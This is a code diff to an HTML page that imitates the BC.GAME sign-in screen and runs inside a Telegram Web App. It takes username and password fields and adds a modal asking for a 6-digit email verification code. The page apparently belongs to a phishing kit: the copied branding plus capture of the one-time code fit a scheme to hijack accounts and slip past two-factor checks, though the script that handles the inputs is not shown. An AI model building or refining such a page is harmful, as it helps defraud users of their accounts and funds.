@@ -9,7 +9,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="main-container">
         <header>
             <div class="logo">
                 <img src="https://bc.game/assets/logo.77e74883.png" alt="BC.GAME" onerror="this.src='https://placehold.co/120x30/1e2328/3bc117?text=BC.GAME'">
@@ -37,16 +37,16 @@
                 <div class="input-group">
                     <input type="text" id="username" placeholder="Email / Phone Number / Username" required>
                 </div>
-                <div class="input-group password-group">
-                    <input type="password" id="password" placeholder="Password" required>
+                <div class="input-group password-group" id="password-container">
+                    <input type="password" id="password" placeholder="Password">
                     <button type="button" class="toggle-password">
                         <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </button>
                 </div>
                 
-                <a href="#" class="forgot-password">Forgot your password?</a>
+                <a href="#" class="forgot-password" id="forgot-password">Forgot your password?</a>
 
-                <button type="submit" class="submit-btn">Sign In</button>
+                <button type="submit" class="submit-btn" id="submit-btn">Sign In</button>
             </form>
 
             <p class="signup-prompt">New to BC.GAME? <a href="#">Create account</a></p>
@@ -63,15 +63,44 @@
                 
                 <div class="social-icons">
                     <button class="icon-btn"><img src="https://www.google.com/favicon.ico" alt="Google"></button>
+                    <button class="icon-btn"><img src="https://x.com/favicon.ico" alt="X"></button>
                     <button class="icon-btn"><img src="https://telegram.org/favicon.ico" alt="Telegram"></button>
                     <button class="icon-btn"><img src="https://www.facebook.com/favicon.ico" alt="FB"></button>
-                    <button class="icon-btn"><img src="https://www.whatsapp.com/favicon.ico" alt="WA"></button>
                     <button class="icon-btn"><img src="https://line.me/favicon.ico" alt="Line"></button>
                     <button class="icon-btn"><img src="https://steampowered.com/favicon.ico" alt="Steam"></button>
                 </div>
             </div>
         </main>
     </div>
+
+    <!-- Email Verification Modal -->
+    <div id="otp-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close" id="modal-close">
+                <svg viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+            </button>
+            <div class="modal-icon">
+                <div class="icon-circle">
+                    <svg viewBox="0 0 24 24" width="32" height="32"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                </div>
+            </div>
+            <h2>Email Verification</h2>
+            <p class="modal-desc">Please enter the 6-digit verification code sent on e-mail</p>
+            
+            <div class="verification-field">
+                <label>Verification Code</label>
+                <div class="otp-input-group">
+                    <input type="text" id="otp-input" placeholder="6-digit verification code" maxlength="6">
+                    <button class="paste-btn">Paste</button>
+                </div>
+            </div>
+
+            <p class="resend-text">Resend in <span id="timer">46</span>s</p>
+
+            <button class="confirm-btn" id="confirm-btn">Confirm</button>
+        </div>
+    </div>
+
     <script src="script.js"></script>
 </body>
 </html>
